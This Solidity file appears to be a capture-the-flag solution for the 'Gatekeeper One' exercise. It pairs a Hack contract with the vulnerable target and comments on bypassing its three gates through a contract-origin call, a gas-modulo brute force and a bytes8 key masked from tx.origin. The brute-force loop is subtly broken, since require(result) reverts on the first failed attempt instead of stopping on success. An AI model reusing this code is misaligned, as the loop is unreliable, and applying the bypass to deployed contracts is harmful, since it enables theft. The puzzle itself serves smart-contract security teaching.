// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
    function attack(address _target) external {
        // Gate One
        // It would pass when we call `enter` method using a contact

        // Gate Two
        // total gas = (8191 * k) + i
        // i = the amount of gas consumed when executing opcodes before getting to the require statement
        // We could figure our i using brute force

        // Gate Three [Lot of typecasting]
        // INPUT: 0x B1 B2 B3 B4 B5 B6 B7 B8

        // Requirement 1
        // (uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
        // Converting bytes8 => uint64 is representing the 8 byte string in numerical representation
        // (uint32(uint64(_gateKey)) => 0x B5 B6 B7 B8
        // uint16(uint64(_gateKey)) => 0x B7 B8
        // So, (uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)) can be equal only when B5 and B6 are 0
        // 0x B1 B2 B3 B4 00 00 B7 B8

        // Requirement 2
        // (uint32(uint64(_gateKey)) != uint64(_gateKey)
        // (uint32(uint64(_gateKey)) => 0x B5 B6 B7 B8
        // uint64(_gateKey) => 0x B1 B2 B3 B4 B5 B6 B7 B8
        // So, (uint32(uint64(_gateKey)) != uint64(_gateKey), this would mean atleast one from B1 B2 B3 B4 cannot be zero
        // Let us assume B4 is non-zero
        // 0x B1 B2 B3 01 00 00 B7 B8

        // Requirement 3
        // uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
        // Converting tx.origin => uint160 is representing the address in numerical representation [20 bytes or 160 bits]
        // (uint32(uint64(_gateKey)) => 0x B5 B6 B7 B8
        // uint16(uint160(tx.origin)) => last 2 bytes of tx.origin
        // Since, B5 and B6 are 0. 0x
        // So, B7 B8 == last 2 bytes of tx.origin

        // Solution
        // B1 B2 B3 B4 can be any non-zero values, so we perform and operation
        // FF = 1111 1111
        // B5 and B6 needs to be zero
        bytes8 key = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);

        for (uint i = 0; i < 300; i++) {
            uint256 totalGas = i + (8191 * 2);
            (bool result, ) = _target.call{gas: totalGas}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );

            require(result, "Call failed");
        }
    }
}

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
